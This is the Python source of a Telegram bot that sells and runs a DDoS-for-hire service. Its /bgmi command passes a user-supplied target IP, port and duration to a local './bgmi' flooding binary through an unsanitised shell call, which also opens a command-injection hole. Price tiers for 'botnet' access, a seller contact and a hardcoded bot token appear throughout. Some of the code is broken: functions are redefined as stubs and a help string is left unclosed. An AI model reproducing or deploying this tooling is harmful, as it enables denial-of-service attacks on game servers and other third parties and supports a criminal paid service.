
import telebot
import subprocess
import requests
import datetime
import os
import pytz


# insert your Telegram bot token here
bot = telebot.TeleBot('6963762658:AAEg_OFDu9QzyM-SL4daqfROm7I4918PQ7c')

# Admin user IDs
admin_id = ["6129136659","6129136659"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# File to store free user IDs and their credits
FREE_USER_FILE = "free_users.txt"

# Dictionary to store free user credits
free_user_credits = {}


# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass


# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ❌."
            else:
                file.truncate(0)
                response = "SAB CLEAR HO GYA✅"
    except FileNotFoundError:
        response = "KUCH NI H AB✅."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")


# Dictionary to store the approval expiry date for each user
import datetime

# Dictionary to store the approval expiry date for each user
user_approval_expiry = {}

# Function to calculate remaining approval time
def get_remaining_approval_time(user_id):
    expiry_date = user_approval_expiry.get(user_id)
    if expiry_date:
        remaining_time = expiry_date - datetime.datetime.now(tz=pytz.utc)
        if remaining_time.total_seconds() < 0:
            del user_approval_expiry[user_id]  # Remove expired user
            return "Expired"
        else:
            days, seconds = remaining_time.days, remaining_time.seconds
            hours = seconds // 3600
            minutes = (seconds % 3600) // 60
            return f"{days} days, {hours} hours, {minutes} minutes"
    else:
        return "N/A"

import datetime
import pytz
import logging


# Set up logging for debugging
#logging.basicConfig(level=logging.DEBUG)

# Dictionary to store the approval expiry date for each user
user_approval_expiry = {}

# Indian Standard Time (IST) timezone
ist = pytz.timezone('Asia/Kolkata')

# Function to calculate remaining approval time
def get_remaining_approval_time(user_id):
    expiry_date = user_approval_expiry.get(user_id)
    if expiry_date:
        remaining_time = expiry_date - datetime.datetime.now(tz=pytz.utc)
        if remaining_time.days < 0:
            return "Expired"
        else:
            return str(remaining_time)
    else:
        return "N/A"

# Function to add or update user approval expiry date
def set_approval_expiry_date(user_id, duration, time_unit):
    current_time = datetime.datetime.now(pytz.utc)
    logging.debug(f"Setting expiry date: {duration} {time_unit} from now.")

    if time_unit in ["minute", "minutes"]:
        expiry_date = current_time + datetime.timedelta(minutes=duration)
    elif time_unit in ["hour", "hours"]:
        expiry_date = current_time + datetime.timedelta(hours=duration)
    elif time_unit in ["day", "days"]:
        expiry_date = current_time + datetime.timedelta(days=duration)
    elif time_unit in ["week", "weeks"]:
        expiry_date = current_time + datetime.timedelta(weeks=duration)
    elif time_unit in ["month", "months"]:
        expiry_date = current_time + datetime.timedelta(days=30 * duration)  # Approximation of a month
    else:
        return False

    user_approval_expiry[user_id] = expiry_date
    logging.debug(f"Expiry date for user {user_id} set to {expiry_date.strftime('%Y-%m-%d %H:%M:%S %Z')}.")
    return True

# Command handler for adding a user with approval time
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            duration_str = command[2]

            try:
                # Split the numeric part and the unit
                duration = int(''.join(filter(str.isdigit, duration_str)))
                time_unit = ''.join(filter(str.isalpha, duration_str)).lower()
                if duration <= 0 or time_unit not in ('minute', 'minutes', 'hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
                    raise ValueError
            except ValueError:
                response = "Invalid duration format. Please provide a positive integer followed by 'minute(s)', 'hour(s)', 'day(s)', 'week(s)', or 'month(s)'."
                bot.reply_to(message, response)
                return

            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                if set_approval_expiry_date(user_to_add, duration, time_unit):
                    expiry_date = user_approval_expiry[user_to_add]
                    # Convert to local time for display
                    local_expiry_date = expiry_date.astimezone(pytz.timezone('Asia/Kolkata'))  # Replace with your local timezone
                    response = f"User {user_to_add} ADD HO GYA H BHAI {duration} {time_unit}. TERA TIME KHATAM HOGA {local_expiry_date.strftime('%Y-%m-%d %H:%M:%S %Z')} 👍."
                else:
                    response = "BHAI SAHI SE ADD KR LE YR."
            else:
                response = "User already exists 🤦‍♂️."
        else:
            response = "BHAI ADD KRNA NHI AATA KYA LODE🤬 (e.g., 1minute, 1hour, 2days, 3weeks, 4months) to add 😘."
    else:
        response = "Only Admin Can Run This Command 😡."

    bot.reply_to(message, response)



@bot.message_handler(commands=['myinfo'])
def get_user_info(message):
    user_id = str(message.chat.id)
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else "N/A"
    user_role = "Admin" if user_id in admin_id else "User"
    remaining_time = get_remaining_approval_time(user_id)
    
    approval_expiry_date = user_approval_expiry.get(user_id, "Not Approved")
    if approval_expiry_date != "Not Approved":
        approval_expiry_date_ist = approval_expiry_date.astimezone(ist).strftime('%Y-%m-%d %H:%M:%S')
    else:
        approval_expiry_date_ist = "Not Approved"
    
    response = (f"👤 Your Info:\n\n🆔 User ID: <code>{user_id}</code>\n📝 Username: {username}\n🔖 Role: {user_role}\n"
                f"📅 Approval Expiry Date: {approval_expiry_date_ist}\n⏳ Remaining Approval Time: {remaining_time}")
    bot.reply_to(message, response, parse_mode="HTML")




@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} GAND MAR LI BHAI TERI 🖕."
            else:
                response = f"User {user_to_remove} LIST SE GYA AB TOO ❌."
        else:
            response = '''MAR GAND PE LAAT🦵. 
✅ Usage: /remove <userid>😘'''
    else:
        response = "Only Admin Can Run This Command 😡."

    bot.reply_to(message, response)


@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "SB UDA DIYA. No data found ❌."
                else:
                    file.truncate(0)
                    response = "SAB UD GYA✅"
        except FileNotFoundError:
            response = "PHLE HI UD GYA ❌."
    else:
        response = "Only Admin Can Run This Command 😡."
    bot.reply_to(message, response)



@bot.message_handler(commands=['clearusers'])
def clear_users_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "KYA DEKH RA KOI NI BACHA H BHAI AB 🤣❌."
                else:
                    file.truncate(0)
                    response = "SBKI GAND MAR LI🖕 ✅"
        except FileNotFoundError:
            response = "SBKO HATA CHUKA H BHAI ❌."
    else:
        response = "Only Admin Can Run This Command 😡."
    bot.reply_to(message, response)
 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "KOI BAAKI RH GYA KYA ❌"
        except FileNotFoundError:
            response = "GALTI SE BACH GYA RE ❌"
    else:
        response = "TOO NHI DEKH PAYEGA LODE 😡."
    bot.reply_to(message, response)


@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found ❌."
                bot.reply_to(message, response)
        else:
            response = "No data found ❌"
            bot.reply_to(message, response)
    else:
        response = "Only Admin Can Run This Command 😡."
        bot.reply_to(message, response)



# Function to handle the reply when the attack is finished
def finish_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"🎉 Attack Finished!\n\nTarget: {target}\nPort: {port}\nTime: {time} Seconds\nMethod: VIP-BGMI-UDP"
    bot.reply_to(message, response)




# Cooldown dictionary and time
import datetime
import subprocess
import signal

# Dictionary to store ongoing processes
bgmi_processes = {}



# Cooldown dictionary and time
bgmi_cooldown = {}
COOLDOWN_TIME = 10  # Cooldown time in seconds

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    print(f"User ID: {user_id}")  # Debug: Print the user ID
    print(f"Allowed User IDs: {allowed_user_ids}")  # Debug: Print allowed user IDs
    print(f"Admin IDs: {admin_id}")  # Debug: Print admin IDs

    if user_id in allowed_user_ids:
        print(f"{user_id} is an allowed user.")  # Debug: User is allowed
        # Check if the user is in admin_ids (admins have no cooldown)
        if user_id not in admin_id:
            print(f"{user_id} is not an admin.")  # Debug: User is not an admin
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "You Are On Cooldown ❌. Please Wait 10sec Before Running The /bgmi Command Again."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, port, and time
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer
            if time > 700:
                response = "Error: Time interval must be less than 300."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./bgmi {target} {port} {time} 300"
                process = subprocess.Popen(full_command, shell=True)
                bgmi_processes[user_id] = process  # Track the process
                response = f"BGMI Attack Started. Target: {target} Port: {port} Time: {time}"
        else:
            response = "✅ Usage :- /bgmi <target> <port> <time>"
    else:
        response = ("🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /bgmi command. "
                    "To gain access and unleash the power of attacks, you can:\n\n👉 Contact an Admin or the Owner for approval.\n"
                    "🌟 Become a proud supporter and purchase approval.\n💬 Chat with an admin now and level up your capabilities!\n\n"
                    "🚀 Ready to supercharge your experience? Take action and get ready for powerful attacks!")

    bot.reply_to(message, response)

# Handler for /stop command
@bot.message_handler(commands=['stop'])
def handle_stop(message):
    user_id = str(message.chat.id)
    print(f"User ID: {user_id}")  # Debug: Print the user ID for stop command
    if user_id in allowed_user_ids:
        print(f"{user_id} is an allowed user for stopping.")  # Debug: User is allowed
        if user_id in bgmi_processes:
            process = bgmi_processes[user_id]
            process.terminate()  # Use terminate() method to stop the process
            process.wait()  # Wait for the process to terminate
            del bgmi_processes[user_id]
            response = "BGMI Attack Stopped."
        else:
            response = "No ongoing BGMI attack to stop."
    else:
        response = ("🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /stop command. "
                    "To gain access, contact an Admin or the Owner.")

    bot.reply_to(message, response)

# Function to log commands (implement as needed)
def record_command_logs(user_id, command, target, port, time):
    print(f"Logging command: {user_id} {command} {target} {port} {time}")  # Debug: Log the command details
    pass

# Function to log additional info (implement as needed)
def log_command(user_id, target, port, time):
    print(f"Log additional info: {user_id} {target} {port} {time}")  # Debug: Log additional details
    pass

# Function to reply when attack starts (implement as needed)
def start_attack_reply(message, target, port, time):
    print(f"Replying to start attack: {target} {port} {time}")  # Debug: Print start attack details
    bot.reply_to(message, f"Starting attack on {target} at port {port} for {time} seconds.")




# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "❌ No Command Logs Found For You ❌."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "You Are Not Authorized To Use This Command 😡."

    bot.reply_to(message, response)


@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''🤖 Available commands:
💥 /bgmi : Method For Bgmi Servers. 
💥 /rules : Please Check Before Use !!.
💥 /mylogs : To Check Your Recents Attacks.
💥 /plan : Checkout Our Botnet Rates.
💥 /myinfo : TO Check Your WHOLE INFO.
💥 /stop : TO STOP ONGOING ATTACK.
🤖 To See Admin Commands:
💥 /admincmd : Shows All Admin Commands.

Buy From :- @O_P_J_I_R_E_N

Official Channel :- https://t.me/JIREN_DDOS
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''👋🏻Welcome to Your Home, {user_name}! Feel Free to Explore.
🤖Try To Run This Command : /help 
✅Join :- '''
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules ⚠️:

1. bot ka sat bakchodi nhi wrna !! Ban From Bot
2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot.
3. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:

Vip 🌟 :
-> Attack Time : 300 (S)
> After Attack Limit : 10 sec
-> Concurrents Attack : 5

Pr-ice List💸 :
Day-->300 Rs
Week-->700 Rs
Month-->1800 Rs
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:

💥 /add <userId> : Add a User.
💥 /remove <userid> Remove a User.
💥 /allusers : Authorised Users Lists.
💥 /logs : All Users Logs.
💥 /broadcast : Broadcast a Message.
💥 /clearlogs : Clear The Logs File.
💥 /clearusers : Clear The USERS File.
💥 /STOPALL : STOP ALL ATTACKS THAT ARE RUNNING.
'''
    bot.reply_to(message, response)


@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "⚠️ Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users 👍."
        else:
            response = "🤖 Please Provide A Message To Broadcast."
    else:
        response = "Only Admin Can Run This Command 😡."

    bot.reply_to(message, response)




bot.polling()